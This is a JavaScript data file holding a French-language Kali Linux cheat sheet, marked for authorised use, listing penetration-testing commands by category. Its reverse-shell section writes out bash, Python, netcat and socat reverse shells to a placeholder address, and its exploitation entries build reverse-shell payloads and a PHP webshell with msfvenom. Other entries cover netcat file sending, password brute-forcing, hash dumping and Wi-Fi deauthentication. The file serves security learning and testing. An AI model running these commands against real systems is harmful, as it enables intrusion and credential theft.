// Aide-mémoire des commandes Kali Linux — usage éthique et autorisé uniquement.
// Chaque entrée : { tool, desc, cmd }
window.KALI_DATA = [
  {
    cat: "Installer Kali Linux (officiel)",
    icon: "💿",
    desc: "Télécharger et installer le vrai Kali sur un ordinateur",
    items: [
      { tool: "Site officiel", desc: "Télécharger l'ISO officielle (source sûre)", cmd: "https://www.kali.org/get-kali/" },
      { tool: "Documentation", desc: "Guide d'installation officiel", cmd: "https://www.kali.org/docs/installation/" },
      { tool: "sha256sum", desc: "Vérifier l'intégrité de l'ISO téléchargée", cmd: "sha256sum kali-linux-*.iso" },
      { tool: "lsblk", desc: "Identifier la clé USB (ex. /dev/sdb)", cmd: "lsblk" },
      { tool: "dd", desc: "Créer une clé USB bootable (Linux/macOS)", cmd: "sudo dd if=kali-linux-*.iso of=/dev/sdX bs=4M status=progress && sync" },
      { tool: "balenaEtcher", desc: "Créer une clé USB (Windows/graphique)", cmd: "https://etcher.balena.io/" },
      { tool: "Kali sur WSL", desc: "Installer Kali sous Windows (WSL)", cmd: "wsl --install -d kali-linux" },
      { tool: "kali-linux-default", desc: "Installer le métapaquet d'outils par défaut", cmd: "sudo apt install -y kali-linux-default" },
      { tool: "kali-linux-large", desc: "Installer un large panel d'outils", cmd: "sudo apt install -y kali-linux-large" }
    ]
  },
  {
    cat: "Système & bases Kali",
    icon: "🐧",
    desc: "Mise à jour, gestion des paquets, services",
    items: [
      { tool: "apt update", desc: "Mettre à jour la liste des paquets", cmd: "sudo apt update && sudo apt full-upgrade -y" },
      { tool: "apt install", desc: "Installer un outil", cmd: "sudo apt install <paquet>" },
      { tool: "apt search", desc: "Chercher un paquet", cmd: "apt search <mot-clé>" },
      { tool: "kali-tweaks", desc: "Configurer Kali (shells, réseau, métapaquets)", cmd: "sudo kali-tweaks" },
      { tool: "systemctl", desc: "Gérer un service (ex. ssh)", cmd: "sudo systemctl start ssh && sudo systemctl status ssh" },
      { tool: "service", desc: "Lancer/arrêter un service", cmd: "sudo service postgresql start" },
      { tool: "msfdb", desc: "Initialiser la base de Metasploit", cmd: "sudo msfdb init" },
      { tool: "whoami / id", desc: "Vérifier l'utilisateur et les privilèges", cmd: "id" },
      { tool: "uname", desc: "Version du noyau et de l'OS", cmd: "uname -a" },
      { tool: "ip a", desc: "Afficher les interfaces réseau", cmd: "ip a" },
      { tool: "ifconfig", desc: "Configurer/afficher une interface", cmd: "sudo ifconfig eth0" },
      { tool: "history", desc: "Historique des commandes", cmd: "history | less" },
      { tool: "tmux", desc: "Multiplexeur de terminal (sessions persistantes)", cmd: "tmux new -s pentest" }
    ]
  },
  {
    cat: "Reconnaissance & OSINT",
    icon: "🔍",
    desc: "Collecte d'informations passive et active",
    items: [
      { tool: "whois", desc: "Informations d'enregistrement d'un domaine", cmd: "whois exemple.com" },
      { tool: "dig", desc: "Requêtes DNS détaillées", cmd: "dig exemple.com ANY +noall +answer" },
      { tool: "dig AXFR", desc: "Tenter un transfert de zone DNS", cmd: "dig AXFR exemple.com @<serveur-dns>" },
      { tool: "host", desc: "Résolution DNS rapide", cmd: "host -a exemple.com" },
      { tool: "nslookup", desc: "Interroger un serveur DNS", cmd: "nslookup exemple.com" },
      { tool: "dnsrecon", desc: "Énumération DNS (transfert de zone, brute)", cmd: "dnsrecon -d exemple.com" },
      { tool: "dnsenum", desc: "Énumération DNS complète", cmd: "dnsenum exemple.com" },
      { tool: "theHarvester", desc: "Emails, sous-domaines, hôtes (OSINT)", cmd: "theHarvester -d exemple.com -b all" },
      { tool: "sublist3r", desc: "Énumération de sous-domaines", cmd: "sublist3r -d exemple.com" },
      { tool: "amass", desc: "Cartographie de surface d'attaque", cmd: "amass enum -d exemple.com" },
      { tool: "assetfinder", desc: "Trouver des domaines/sous-domaines liés", cmd: "assetfinder exemple.com" },
      { tool: "fierce", desc: "Reconnaissance DNS", cmd: "fierce --domain exemple.com" },
      { tool: "recon-ng", desc: "Framework de reconnaissance modulaire", cmd: "recon-ng" },
      { tool: "maltego", desc: "Analyse de liens et OSINT graphique", cmd: "maltego" },
      { tool: "spiderfoot", desc: "Automatisation OSINT", cmd: "spiderfoot -l 127.0.0.1:5001" },
      { tool: "wafw00f", desc: "Détecter un pare-feu applicatif (WAF)", cmd: "wafw00f http://exemple.com" }
    ]
  },
  {
    cat: "Scan réseau & ports",
    icon: "📡",
    desc: "Découverte d'hôtes et de services",
    items: [
      { tool: "nmap", desc: "Scan de ports basique", cmd: "nmap -sV -sC <cible>" },
      { tool: "nmap", desc: "Scan complet de tous les ports", cmd: "nmap -p- -T4 <cible>" },
      { tool: "nmap", desc: "Détection d'OS et scripts NSE", cmd: "sudo nmap -A -O <cible>" },
      { tool: "nmap", desc: "Découverte d'hôtes (ping sweep)", cmd: "nmap -sn 192.168.1.0/24" },
      { tool: "nmap", desc: "Scan UDP des ports courants", cmd: "sudo nmap -sU --top-ports 100 <cible>" },
      { tool: "nmap", desc: "Scan furtif SYN", cmd: "sudo nmap -sS <cible>" },
      { tool: "nmap", desc: "Sauvegarder tous les formats de sortie", cmd: "nmap -sV -oA scan <cible>" },
      { tool: "masscan", desc: "Scan de ports très rapide", cmd: "sudo masscan <cible>/24 -p1-65535 --rate=1000" },
      { tool: "netdiscover", desc: "Découverte ARP sur le réseau local", cmd: "sudo netdiscover -r 192.168.1.0/24" },
      { tool: "arp-scan", desc: "Scan ARP du réseau local", cmd: "sudo arp-scan --localnet" },
      { tool: "rustscan", desc: "Scan de ports ultra-rapide", cmd: "rustscan -a <cible> -- -sV" },
      { tool: "fping", desc: "Ping multiple d'une plage", cmd: "fping -a -g 192.168.1.0/24 2>/dev/null" }
    ]
  },
  {
    cat: "Énumération de services",
    icon: "🗂️",
    desc: "SMB, FTP, SNMP, SMTP, NFS…",
    items: [
      { tool: "enum4linux-ng", desc: "Énumération SMB/Windows complète", cmd: "enum4linux-ng -A <cible>" },
      { tool: "smbclient", desc: "Lister les partages SMB", cmd: "smbclient -L //<cible>/ -N" },
      { tool: "smbmap", desc: "Cartographier les partages et droits SMB", cmd: "smbmap -H <cible>" },
      { tool: "crackmapexec", desc: "Énumération/authentification SMB", cmd: "crackmapexec smb <cible>" },
      { tool: "nmap smb", desc: "Scripts SMB (partages, vulns)", cmd: "nmap --script smb-enum-shares,smb-os-discovery <cible>" },
      { tool: "showmount", desc: "Lister les exports NFS", cmd: "showmount -e <cible>" },
      { tool: "snmpwalk", desc: "Interroger SNMP (community public)", cmd: "snmpwalk -v2c -c public <cible>" },
      { tool: "onesixtyone", desc: "Brute-force de community SNMP", cmd: "onesixtyone -c community.txt <cible>" },
      { tool: "ftp", desc: "Se connecter en FTP", cmd: "ftp <cible>" },
      { tool: "smtp-user-enum", desc: "Énumérer les utilisateurs SMTP", cmd: "smtp-user-enum -M VRFY -U users.txt -t <cible>" },
      { tool: "rpcclient", desc: "Requêtes RPC anonymes", cmd: "rpcclient -U \"\" -N <cible>" },
      { tool: "ldapsearch", desc: "Interroger un annuaire LDAP", cmd: "ldapsearch -x -H ldap://<cible> -b \"dc=exemple,dc=com\"" }
    ]
  },
  {
    cat: "Web — énumération & scan",
    icon: "🌐",
    desc: "Applications et serveurs web",
    items: [
      { tool: "gobuster", desc: "Brute-force de répertoires web", cmd: "gobuster dir -u http://<cible> -w /usr/share/wordlists/dirb/common.txt" },
      { tool: "gobuster", desc: "Énumération de sous-domaines (vhost)", cmd: "gobuster vhost -u http://<cible> -w <wordlist>" },
      { tool: "gobuster dns", desc: "Brute-force de sous-domaines", cmd: "gobuster dns -d exemple.com -w <wordlist>" },
      { tool: "ffuf", desc: "Fuzzing web rapide", cmd: "ffuf -u http://<cible>/FUZZ -w /usr/share/wordlists/dirb/common.txt" },
      { tool: "ffuf", desc: "Fuzzing de paramètres GET", cmd: "ffuf -u 'http://<cible>/?FUZZ=test' -w <wordlist> -fs 0" },
      { tool: "feroxbuster", desc: "Brute-force récursif de contenu", cmd: "feroxbuster -u http://<cible>" },
      { tool: "dirb", desc: "Scanner de contenu web", cmd: "dirb http://<cible>" },
      { tool: "dirsearch", desc: "Découverte de chemins web", cmd: "dirsearch -u http://<cible>" },
      { tool: "nikto", desc: "Scanner de vulnérabilités web", cmd: "nikto -h http://<cible>" },
      { tool: "whatweb", desc: "Empreinte des technologies web", cmd: "whatweb http://<cible>" },
      { tool: "wpscan", desc: "Scan de sécurité WordPress", cmd: "wpscan --url http://<cible> --enumerate u" },
      { tool: "joomscan", desc: "Scanner Joomla", cmd: "joomscan --url http://<cible>" },
      { tool: "sqlmap", desc: "Détection/exploitation d'injections SQL", cmd: "sqlmap -u \"http://<cible>/page?id=1\" --batch --dbs" },
      { tool: "sqlmap", desc: "SQLi depuis une requête capturée", cmd: "sqlmap -r requete.txt --batch --dump" },
      { tool: "wfuzz", desc: "Fuzzing de paramètres web", cmd: "wfuzz -c -z file,<wordlist> http://<cible>/FUZZ" },
      { tool: "curl", desc: "Requête HTTP avec en-têtes", cmd: "curl -i -L http://<cible>" },
      { tool: "burpsuite", desc: "Proxy d'interception web", cmd: "burpsuite" }
    ]
  },
  {
    cat: "Analyse de vulnérabilités",
    icon: "🛡️",
    desc: "Détection de failles",
    items: [
      { tool: "nmap NSE", desc: "Scripts de détection de vulnérabilités", cmd: "nmap --script vuln <cible>" },
      { tool: "searchsploit", desc: "Rechercher un exploit connu", cmd: "searchsploit apache 2.4" },
      { tool: "searchsploit -x", desc: "Afficher un exploit", cmd: "searchsploit -x <chemin>" },
      { tool: "nuclei", desc: "Scan de vulnérabilités par templates", cmd: "nuclei -u http://<cible>" },
      { tool: "nuclei", desc: "Scan avec templates critiques", cmd: "nuclei -u http://<cible> -severity critical,high" },
      { tool: "openvas / gvm", desc: "Scanner de vulnérabilités complet", cmd: "sudo gvm-setup && sudo gvm-start" },
      { tool: "wpscan", desc: "Vulnérabilités WordPress (API token)", cmd: "wpscan --url http://<cible> --api-token <token>" }
    ]
  },
  {
    cat: "Exploitation",
    icon: "💥",
    desc: "Frameworks et exploitation (labs autorisés)",
    items: [
      { tool: "msfconsole", desc: "Lancer Metasploit", cmd: "msfconsole" },
      { tool: "msfconsole -q", desc: "Lancer un module directement", cmd: "msfconsole -q -x \"use exploit/multi/handler\"" },
      { tool: "msfvenom", desc: "Payload reverse shell Linux", cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf" },
      { tool: "msfvenom", desc: "Payload reverse shell Windows", cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe" },
      { tool: "msfvenom", desc: "Webshell PHP", cmd: "msfvenom -p php/reverse_php LHOST=<ip> LPORT=4444 -f raw -o shell.php" },
      { tool: "searchsploit -m", desc: "Copier un exploit localement", cmd: "searchsploit -m <chemin/exploit>" },
      { tool: "netcat", desc: "Écouteur pour reverse shell", cmd: "nc -lvnp 4444" },
      { tool: "rlwrap nc", desc: "Écouteur avec historique/édition", cmd: "rlwrap nc -lvnp 4444" }
    ]
  },
  {
    cat: "Reverse shells & upgrade",
    icon: "🐚",
    desc: "Obtenir et stabiliser un shell (labs)",
    items: [
      { tool: "bash", desc: "Reverse shell Bash", cmd: "bash -i >& /dev/tcp/<ip>/4444 0>&1" },
      { tool: "python", desc: "Reverse shell Python", cmd: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<ip>\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'" },
      { tool: "nc", desc: "Reverse shell netcat", cmd: "nc <ip> 4444 -e /bin/bash" },
      { tool: "pty upgrade", desc: "Stabiliser un shell interactif", cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
      { tool: "stty", desc: "Récupérer un shell pleinement interactif", cmd: "stty raw -echo; fg" },
      { tool: "socat", desc: "Reverse shell chiffré", cmd: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:4444" }
    ]
  },
  {
    cat: "Mots de passe & hachages",
    icon: "🔑",
    desc: "Cassage de mots de passe (comptes autorisés)",
    items: [
      { tool: "hydra", desc: "Brute-force de service (ex. SSH)", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<cible>" },
      { tool: "hydra", desc: "Brute-force de formulaire web POST", cmd: "hydra -l admin -P rockyou.txt <cible> http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"" },
      { tool: "hydra", desc: "Brute-force FTP", cmd: "hydra -L users.txt -P rockyou.txt ftp://<cible>" },
      { tool: "john", desc: "Cassage de hachages (John the Ripper)", cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt" },
      { tool: "john --show", desc: "Afficher les mots de passe cassés", cmd: "john --show hashes.txt" },
      { tool: "zip2john", desc: "Extraire le hash d'un zip protégé", cmd: "zip2john fichier.zip > zip.hash" },
      { tool: "ssh2john", desc: "Extraire le hash d'une clé SSH", cmd: "ssh2john id_rsa > ssh.hash" },
      { tool: "hashcat", desc: "Cassage GPU (ex. MD5 mode 0)", cmd: "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt" },
      { tool: "hashcat", desc: "Cassage NTLM (mode 1000)", cmd: "hashcat -m 1000 -a 0 hashes.txt rockyou.txt" },
      { tool: "hashcat rules", desc: "Attaque par dictionnaire + règles", cmd: "hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule" },
      { tool: "hash-identifier", desc: "Identifier un type de hachage", cmd: "hash-identifier" },
      { tool: "hashid", desc: "Identifier un hachage", cmd: "hashid <hash>" },
      { tool: "medusa", desc: "Brute-force parallèle", cmd: "medusa -h <cible> -u admin -P rockyou.txt -M ssh" },
      { tool: "crunch", desc: "Générer une wordlist", cmd: "crunch 6 8 abc123 -o wordlist.txt" },
      { tool: "cupp", desc: "Wordlist personnalisée (profil)", cmd: "cupp -i" },
      { tool: "cewl", desc: "Générer une wordlist depuis un site", cmd: "cewl http://<cible> -w wordlist.txt" }
    ]
  },
  {
    cat: "Wi-Fi & sans-fil",
    icon: "📶",
    desc: "Audit de réseaux sans-fil (vos propres réseaux)",
    items: [
      { tool: "airmon-ng", desc: "Passer la carte en mode monitor", cmd: "sudo airmon-ng start wlan0" },
      { tool: "airmon-ng check kill", desc: "Tuer les processus gênants", cmd: "sudo airmon-ng check kill" },
      { tool: "airodump-ng", desc: "Capturer le trafic Wi-Fi", cmd: "sudo airodump-ng wlan0mon" },
      { tool: "airodump-ng", desc: "Cibler un réseau et sauvegarder", cmd: "sudo airodump-ng -c <canal> --bssid <BSSID> -w capture wlan0mon" },
      { tool: "aireplay-ng", desc: "Désauthentification (test)", cmd: "sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon" },
      { tool: "aircrack-ng", desc: "Casser une capture WPA (autorisée)", cmd: "aircrack-ng -w rockyou.txt capture.cap" },
      { tool: "wifite", desc: "Audit Wi-Fi automatisé", cmd: "sudo wifite" },
      { tool: "reaver", desc: "Attaque WPS (réseau autorisé)", cmd: "sudo reaver -i wlan0mon -b <BSSID> -vv" },
      { tool: "kismet", desc: "Détection réseaux sans-fil", cmd: "sudo kismet -c wlan0mon" }
    ]
  },
  {
    cat: "Sniffing & MITM",
    icon: "🕵️",
    desc: "Analyse de trafic (réseau autorisé)",
    items: [
      { tool: "wireshark", desc: "Analyseur de paquets graphique", cmd: "wireshark" },
      { tool: "tshark", desc: "Wireshark en ligne de commande", cmd: "sudo tshark -i eth0 -f \"port 80\"" },
      { tool: "tcpdump", desc: "Capture de paquets en ligne de commande", cmd: "sudo tcpdump -i eth0 -w capture.pcap" },
      { tool: "ettercap", desc: "MITM et sniffing", cmd: "sudo ettercap -T -i eth0" },
      { tool: "bettercap", desc: "Framework MITM moderne", cmd: "sudo bettercap -iface eth0" },
      { tool: "responder", desc: "Empoisonnement LLMNR/NBT-NS (lab)", cmd: "sudo responder -I eth0" },
      { tool: "mitmproxy", desc: "Proxy HTTP(S) interactif", cmd: "mitmproxy" }
    ]
  },
  {
    cat: "Post-exploitation & privesc",
    icon: "⬆️",
    desc: "Escalade de privilèges et énumération locale",
    items: [
      { tool: "linpeas", desc: "Énumération d'escalade Linux", cmd: "./linpeas.sh" },
      { tool: "winpeas", desc: "Énumération d'escalade Windows", cmd: "winpeas.exe" },
      { tool: "linenum", desc: "Script d'énumération Linux", cmd: "./LinEnum.sh" },
      { tool: "sudo -l", desc: "Lister les droits sudo", cmd: "sudo -l" },
      { tool: "find SUID", desc: "Chercher les binaires SUID", cmd: "find / -perm -4000 -type f 2>/dev/null" },
      { tool: "getcap", desc: "Chercher les capabilities", cmd: "getcap -r / 2>/dev/null" },
      { tool: "crontab", desc: "Lister les tâches planifiées", cmd: "cat /etc/crontab" },
      { tool: "pspy", desc: "Surveiller les processus sans root", cmd: "./pspy64" },
      { tool: "python shell", desc: "Stabiliser un shell", cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" }
    ]
  },
  {
    cat: "Active Directory & Windows",
    icon: "🪟",
    desc: "Environnements Windows / AD (labs autorisés)",
    items: [
      { tool: "crackmapexec", desc: "Pulvérisation d'identifiants SMB", cmd: "crackmapexec smb <plage> -u users.txt -p 'Password1'" },
      { tool: "impacket-GetNPUsers", desc: "AS-REP Roasting", cmd: "impacket-GetNPUsers exemple.local/ -usersfile users.txt -no-pass" },
      { tool: "impacket-GetUserSPNs", desc: "Kerberoasting", cmd: "impacket-GetUserSPNs exemple.local/user:pass -request" },
      { tool: "impacket-secretsdump", desc: "Extraire les hachages (autorisé)", cmd: "impacket-secretsdump exemple.local/user:pass@<cible>" },
      { tool: "impacket-psexec", desc: "Exécution à distance", cmd: "impacket-psexec exemple.local/user:pass@<cible>" },
      { tool: "evil-winrm", desc: "Shell WinRM", cmd: "evil-winrm -i <cible> -u user -p pass" },
      { tool: "bloodhound-python", desc: "Collecter les données AD", cmd: "bloodhound-python -u user -p pass -d exemple.local -c all" },
      { tool: "smbclient", desc: "Accéder à un partage authentifié", cmd: "smbclient //<cible>/partage -U user" }
    ]
  },
  {
    cat: "Transfert de fichiers",
    icon: "📁",
    desc: "Envoyer/récupérer des fichiers vers la cible",
    items: [
      { tool: "python http", desc: "Serveur HTTP local", cmd: "python3 -m http.server 8000" },
      { tool: "wget", desc: "Télécharger un fichier sur la cible", cmd: "wget http://<ip>:8000/fichier" },
      { tool: "curl -O", desc: "Télécharger avec curl", cmd: "curl -O http://<ip>:8000/fichier" },
      { tool: "scp", desc: "Copie sécurisée via SSH", cmd: "scp fichier user@<cible>:/tmp/" },
      { tool: "nc transfert", desc: "Recevoir un fichier (récepteur)", cmd: "nc -lvnp 4444 > fichier" },
      { tool: "nc transfert", desc: "Envoyer un fichier (émetteur)", cmd: "nc <ip> 4444 < fichier" },
      { tool: "smbserver", desc: "Partage SMB temporaire", cmd: "impacket-smbserver share . -smb2support" }
    ]
  },
  {
    cat: "Encodage & cryptographie",
    icon: "🔐",
    desc: "Encodage, décodage et manipulation de données",
    items: [
      { tool: "base64", desc: "Encoder / décoder base64", cmd: "echo -n 'texte' | base64" },
      { tool: "base64 -d", desc: "Décoder base64", cmd: "echo '<b64>' | base64 -d" },
      { tool: "xxd", desc: "Dump hexadécimal", cmd: "xxd fichier | less" },
      { tool: "openssl", desc: "Hacher une chaîne (SHA-256)", cmd: "echo -n 'texte' | openssl dgst -sha256" },
      { tool: "openssl", desc: "Générer un hash de mot de passe", cmd: "openssl passwd -6 'motdepasse'" },
      { tool: "gpg", desc: "Chiffrer un fichier", cmd: "gpg -c fichier" },
      { tool: "cyberchef", desc: "Boîte à outils d'encodage (web/local)", cmd: "cyberchef" }
    ]
  },
  {
    cat: "Forensics & stéganographie",
    icon: "🔬",
    desc: "Analyse et récupération",
    items: [
      { tool: "binwalk", desc: "Analyser/extraire un firmware ou fichier", cmd: "binwalk -e fichier.bin" },
      { tool: "steghide", desc: "Extraire des données cachées", cmd: "steghide extract -sf image.jpg" },
      { tool: "stegseek", desc: "Brute-force de steghide", cmd: "stegseek image.jpg rockyou.txt" },
      { tool: "exiftool", desc: "Lire les métadonnées", cmd: "exiftool image.jpg" },
      { tool: "foremost", desc: "Récupérer des fichiers", cmd: "foremost -i disk.img -o sortie/" },
      { tool: "strings", desc: "Extraire les chaînes lisibles", cmd: "strings fichier.bin | less" },
      { tool: "file", desc: "Identifier un type de fichier", cmd: "file fichier" },
      { tool: "volatility", desc: "Analyse de dump mémoire", cmd: "volatility -f dump.raw imageinfo" },
      { tool: "zsteg", desc: "Détecter la stégano dans un PNG/BMP", cmd: "zsteg image.png" }
    ]
  },
  {
    cat: "Mobile & Android",
    icon: "📱",
    desc: "Analyse d'applications APK (tests autorisés)",
    items: [
      { tool: "adb devices", desc: "Lister les appareils connectés", cmd: "adb devices" },
      { tool: "adb install", desc: "Installer un APK", cmd: "adb install app.apk" },
      { tool: "adb shell", desc: "Ouvrir un shell sur l'appareil", cmd: "adb shell" },
      { tool: "adb pull", desc: "Extraire un fichier de l'appareil", cmd: "adb pull /data/local/tmp/fichier" },
      { tool: "apktool", desc: "Décompiler/recompiler un APK", cmd: "apktool d app.apk -o sortie/" },
      { tool: "apktool", desc: "Reconstruire un APK", cmd: "apktool b sortie/ -o modifie.apk" },
      { tool: "jadx", desc: "Décompiler un APK en Java (GUI)", cmd: "jadx-gui app.apk" },
      { tool: "jadx", desc: "Décompiler en ligne de commande", cmd: "jadx -d sortie/ app.apk" },
      { tool: "d2j-dex2jar", desc: "Convertir un APK en .jar", cmd: "d2j-dex2jar app.apk -o app.jar" },
      { tool: "keytool", desc: "Générer une clé de signature", cmd: "keytool -genkey -v -keystore ma.keystore -alias cle -keyalg RSA -keysize 2048 -validity 10000" },
      { tool: "apksigner", desc: "Signer un APK modifié", cmd: "apksigner sign --ks ma.keystore modifie.apk" },
      { tool: "frida", desc: "Instrumentation dynamique", cmd: "frida -U -f com.exemple.app -l script.js" },
      { tool: "objection", desc: "Exploration runtime mobile", cmd: "objection -g com.exemple.app explore" },
      { tool: "MobSF", desc: "Analyse statique/dynamique d'apps", cmd: "docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf" }
    ]
  },
  {
    cat: "Docker & conteneurs",
    icon: "🐳",
    desc: "Inspection et sécurité des conteneurs (autorisé)",
    items: [
      { tool: "docker ps", desc: "Lister les conteneurs en cours", cmd: "docker ps -a" },
      { tool: "docker images", desc: "Lister les images locales", cmd: "docker images" },
      { tool: "docker exec", desc: "Ouvrir un shell dans un conteneur", cmd: "docker exec -it <conteneur> /bin/bash" },
      { tool: "docker inspect", desc: "Détails d'un conteneur/image", cmd: "docker inspect <conteneur>" },
      { tool: "docker logs", desc: "Voir les logs d'un conteneur", cmd: "docker logs <conteneur>" },
      { tool: "docker save", desc: "Exporter une image pour analyse", cmd: "docker save <image> -o image.tar" },
      { tool: "dive", desc: "Explorer les couches d'une image", cmd: "dive <image>" },
      { tool: "trivy", desc: "Scanner de vulnérabilités d'image", cmd: "trivy image <image>" },
      { tool: "trivy fs", desc: "Scanner un système de fichiers", cmd: "trivy fs ." },
      { tool: "grype", desc: "Scanner de vulnérabilités conteneur", cmd: "grype <image>" },
      { tool: "docker-bench", desc: "Audit de sécurité Docker (CIS)", cmd: "docker run --rm --net host --pid host --cap-add audit_control -v /var/run/docker.sock:/var/run/docker.sock docker/docker-bench-security" },
      { tool: "deepce", desc: "Énumération d'évasion de conteneur", cmd: "./deepce.sh" },
      { tool: "mount check", desc: "Vérifier si dans un conteneur", cmd: "cat /proc/1/cgroup | grep -i docker" }
    ]
  },
  {
    cat: "Cloud (AWS / Azure / GCP)",
    icon: "☁️",
    desc: "Audit d'environnements cloud (comptes autorisés)",
    items: [
      { tool: "aws sts", desc: "Vérifier l'identité AWS courante", cmd: "aws sts get-caller-identity" },
      { tool: "aws s3 ls", desc: "Lister les buckets S3", cmd: "aws s3 ls" },
      { tool: "aws s3", desc: "Lister le contenu d'un bucket", cmd: "aws s3 ls s3://<bucket> --recursive" },
      { tool: "aws iam", desc: "Lister les utilisateurs IAM", cmd: "aws iam list-users" },
      { tool: "scoutsuite", desc: "Audit de posture multi-cloud", cmd: "scout aws" },
      { tool: "prowler", desc: "Audit de sécurité AWS (CIS)", cmd: "prowler aws" },
      { tool: "pacu", desc: "Framework d'exploitation AWS", cmd: "pacu" },
      { tool: "cloud_enum", desc: "Énumérer ressources cloud publiques", cmd: "cloud_enum -k <mot-clé>" },
      { tool: "s3scanner", desc: "Chercher des buckets S3 exposés", cmd: "s3scanner scan --bucket <nom>" },
      { tool: "az login", desc: "Se connecter à Azure", cmd: "az login" },
      { tool: "az account", desc: "Lister les abonnements Azure", cmd: "az account list -o table" },
      { tool: "gcloud auth", desc: "S'authentifier sur GCP", cmd: "gcloud auth login" },
      { tool: "gcloud projects", desc: "Lister les projets GCP", cmd: "gcloud projects list" }
    ]
  }
];
